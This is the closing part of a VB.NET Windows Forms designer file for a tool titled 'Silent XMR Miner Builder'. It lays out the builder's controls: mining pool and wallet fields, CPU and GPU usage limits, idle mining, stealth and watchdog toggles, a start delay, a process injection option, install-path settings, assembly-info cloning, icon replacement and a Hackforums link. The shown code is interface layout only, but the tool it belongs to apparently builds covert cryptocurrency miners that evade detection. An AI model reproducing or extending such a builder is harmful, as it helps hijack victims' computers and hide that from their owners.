        Me.Label4.Text = "GPU Mining:"
        '
        'toggleEnableGPU
        '
        Me.toggleEnableGPU.BackColor = System.Drawing.Color.Transparent
        Me.toggleEnableGPU.Checked = False
        Me.toggleEnableGPU.ForeColor = System.Drawing.Color.Black
        Me.toggleEnableGPU.Location = New System.Drawing.Point(123, 36)
        Me.toggleEnableGPU.Margin = New System.Windows.Forms.Padding(2)
        Me.toggleEnableGPU.Name = "toggleEnableGPU"
        Me.toggleEnableGPU.Size = New System.Drawing.Size(50, 24)
        Me.toggleEnableGPU.TabIndex = 27
        Me.toggleEnableGPU.Text = "Enable GPU Mining"
        '
        'txtMaxCPU
        '
        Me.txtMaxCPU.BackColor = System.Drawing.Color.Transparent
        Me.txtMaxCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtMaxCPU.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtMaxCPU.ForeColor = System.Drawing.Color.Silver
        Me.txtMaxCPU.FormattingEnabled = True
        Me.txtMaxCPU.ItemHeight = 16
        Me.txtMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
        Me.txtMaxCPU.Items.AddRange(New Object() {"0%", "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
        Me.txtMaxCPU.Location = New System.Drawing.Point(330, 10)
        Me.txtMaxCPU.Name = "txtMaxCPU"
        Me.txtMaxCPU.Size = New System.Drawing.Size(60, 22)
        Me.txtMaxCPU.StartIndex = 2
        Me.txtMaxCPU.TabIndex = 26
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label3.Location = New System.Drawing.Point(263, 11)
        Me.Label3.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(64, 17)
        Me.Label3.TabIndex = 25
        Me.Label3.Text = "Max CPU:"
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.Label28)
        Me.TabPage5.Controls.Add(Me.Label29)
        Me.TabPage5.Controls.Add(Me.Label30)
        Me.TabPage5.Controls.Add(Me.txtStartDelay)
        Me.TabPage5.Controls.Add(Me.labelHackforums)
        Me.TabPage5.Controls.Add(Me.labelGitHub)
        Me.TabPage5.Controls.Add(Me.txtLog)
        Me.TabPage5.Controls.Add(Me.btnBuild)
        Me.TabPage5.Location = New System.Drawing.Point(89, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(418, 189)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Build"
        '
        'Label29
        '
        Me.Label29.AutoSize = True
        Me.Label29.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label29.Location = New System.Drawing.Point(121, 11)
        Me.Label29.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label29.Name = "Label29"
        Me.Label29.Size = New System.Drawing.Size(57, 17)
        Me.Label29.TabIndex = 57
        Me.Label29.Text = "Seconds"
        '
        'Label30
        '
        Me.Label30.AutoSize = True
        Me.Label30.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.Label30.Location = New System.Drawing.Point(10, 11)
        Me.Label30.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label30.Name = "Label30"
        Me.Label30.Size = New System.Drawing.Size(74, 17)
        Me.Label30.TabIndex = 56
        Me.Label30.Text = "Start Delay:"
        '
        'txtStartDelay
        '
        Me.txtStartDelay.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtStartDelay.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtStartDelay.ForeColor = System.Drawing.Color.Silver
        Me.txtStartDelay.Location = New System.Drawing.Point(85, 9)
        Me.txtStartDelay.MaxLength = 32767
        Me.txtStartDelay.MultiLine = False
        Me.txtStartDelay.Name = "txtStartDelay"
        Me.txtStartDelay.Size = New System.Drawing.Size(34, 24)
        Me.txtStartDelay.TabIndex = 55
        Me.txtStartDelay.Text = "30"
        Me.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtStartDelay.UseSystemPasswordChar = False
        Me.txtStartDelay.WordWrap = False
        '
        'labelHackforums
        '
        Me.labelHackforums.AutoSize = True
        Me.labelHackforums.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.labelHackforums.Location = New System.Drawing.Point(57, 167)
        Me.labelHackforums.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.labelHackforums.Name = "labelHackforums"
        Me.labelHackforums.Size = New System.Drawing.Size(72, 15)
        Me.labelHackforums.TabIndex = 22
        Me.labelHackforums.TabStop = True
        Me.labelHackforums.Text = "Hackforums"
        '
        'labelGitHub
        '
        Me.labelGitHub.AutoSize = True
        Me.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.labelGitHub.Location = New System.Drawing.Point(8, 167)
        Me.labelGitHub.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.labelGitHub.Name = "labelGitHub"
        Me.labelGitHub.Size = New System.Drawing.Size(45, 15)
        Me.labelGitHub.TabIndex = 21
        Me.labelGitHub.TabStop = True
        Me.labelGitHub.Text = "GitHub"
        '
        'txtLog
        '
        Me.txtLog.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.txtLog.Font = New System.Drawing.Font("Segoe UI", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtLog.ForeColor = System.Drawing.Color.Silver
        Me.txtLog.Location = New System.Drawing.Point(10, 41)
        Me.txtLog.Margin = New System.Windows.Forms.Padding(2)
        Me.txtLog.MaxLength = 32767
        Me.txtLog.MultiLine = True
        Me.txtLog.Name = "txtLog"
        Me.txtLog.Size = New System.Drawing.Size(399, 119)
        Me.txtLog.TabIndex = 18
        Me.txtLog.Text = "Output..."
        Me.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtLog.UseSystemPasswordChar = False
        Me.txtLog.WordWrap = False
        '
        'btnBuild
        '
        Me.btnBuild.BackColor = System.Drawing.Color.Transparent
        Me.btnBuild.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
        Me.btnBuild.Location = New System.Drawing.Point(309, 9)
        Me.btnBuild.Margin = New System.Windows.Forms.Padding(2)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.Size = New System.Drawing.Size(99, 25)
        Me.btnBuild.TabIndex = 17
        Me.btnBuild.Text = "Build"
        '
        'Form1
        '
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None
        Me.ClientSize = New System.Drawing.Size(535, 272)
        Me.Controls.Add(Me.MephForm1)
        Me.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Margin = New System.Windows.Forms.Padding(2)
        Me.MaximizeBox = False
        Me.MaximumSize = New System.Drawing.Size(535, 272)
        Me.MinimizeBox = False
        Me.MinimumSize = New System.Drawing.Size(535, 272)
        Me.Name = "Form1"
        Me.Opacity = 0.95R
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Silent XMR Miner Builder"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.MephForm1.ResumeLayout(False)
        Me.MephTabcontrol2.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents MephForm1 As MephTheme
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents btn_assemblyRandom As MephButton
    Friend WithEvents btn_assemblyClone As MephButton
    Friend WithEvents num_Assembly4 As MephTextBox
    Friend WithEvents num_Assembly3 As MephTextBox
    Friend WithEvents num_Assembly2 As MephTextBox
    Friend WithEvents num_Assembly1 As MephTextBox
    Friend WithEvents txtTrademark As MephTextBox
    Friend WithEvents txtCompany As MephTextBox
    Friend WithEvents txtCopyright As MephTextBox
    Friend WithEvents txtDescription As MephTextBox
    Friend WithEvents txtProduct As MephTextBox
    Friend WithEvents txtTitle As MephTextBox
    Friend WithEvents txtIconPath As MephTextBox
    Friend WithEvents btnBrowseIcon As MephButton
    Friend WithEvents txtInstallFileName As MephTextBox
    Friend WithEvents Label1 As Label
    Friend WithEvents picIcon As PictureBox
    Friend WithEvents Label2 As Label
    Friend WithEvents txtInstallPathMain As MephComboBox
    Friend WithEvents chkAssembly As MephCheckBox
    Friend WithEvents chkIcon As MephCheckBox
    Friend WithEvents Label8 As Label
    Friend WithEvents txtPoolURL As MephTextBox
    Friend WithEvents Label7 As Label
    Friend WithEvents txtPoolPassowrd As MephTextBox
    Friend WithEvents Label6 As Label
    Friend WithEvents txtPoolUsername As MephTextBox
    Friend WithEvents chkInstall As MephCheckBox
    Friend WithEvents MephTabcontrol2 As MephTabcontrol
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents TabPage5 As TabPage
    Friend WithEvents txtLog As MephTextBox
    Friend WithEvents btnBuild As MephButton
    Friend WithEvents Label10 As Label
    Friend WithEvents Label9 As Label
    Friend WithEvents Label5 As Label
    Friend WithEvents txtInjection As MephComboBox
    Friend WithEvents labelHackforums As LinkLabel
    Friend WithEvents labelGitHub As LinkLabel
    Friend WithEvents TabPage6 As TabPage
    Friend WithEvents Label4 As Label
    Friend WithEvents toggleEnableGPU As MephToggleSwitch
    Friend WithEvents txtMaxCPU As MephComboBox
    Friend WithEvents Label3 As Label
    Friend WithEvents Label11 As Label
    Friend WithEvents toggleEnableIdle As MephToggleSwitch
    Friend WithEvents Label12 As Label
    Friend WithEvents toggleEnableNicehash As MephToggleSwitch
    Friend WithEvents TooltipHelper As ToolTip
    Friend WithEvents Label13 As Label
    Friend WithEvents toggleEnableCPU As MephToggleSwitch
    Friend WithEvents helpLabelMaxCPU As Label
    Friend WithEvents helpLabelEnableCPU As Label
    Friend WithEvents Label16 As Label
    Friend WithEvents Label15 As Label
    Friend WithEvents Label14 As Label
    Friend WithEvents helpLabelWallet As Label
    Friend WithEvents helpLabelPool As Label
    Friend WithEvents helpLabelPassword As Label
    Friend WithEvents helpLabelInstall As Label
    Friend WithEvents Label17 As Label
    Friend WithEvents Label18 As Label
    Friend WithEvents toggleSSLTLS As MephToggleSwitch
    Friend WithEvents Label21 As Label
    Friend WithEvents txtIdleCPU As MephComboBox
    Friend WithEvents Label22 As Label
    Friend WithEvents Label24 As Label
    Friend WithEvents Label23 As Label
    Friend WithEvents txtIdleWait As MephTextBox
    Friend WithEvents Label25 As Label
    Friend WithEvents Label26 As Label
    Friend WithEvents Label27 As Label
    Friend WithEvents toggleEnableStealth As MephToggleSwitch
    Friend WithEvents Label28 As Label
    Friend WithEvents Label29 As Label
    Friend WithEvents Label30 As Label
    Friend WithEvents txtStartDelay As MephTextBox
    Friend WithEvents Label31 As Label
    Friend WithEvents Label32 As Label
    Friend WithEvents Label35 As Label
    Friend WithEvents Label36 As Label
    Friend WithEvents Label37 As Label
    Friend WithEvents toggleWatchdog As MephToggleSwitch
    Friend WithEvents MephButton1 As MephButton
End Class
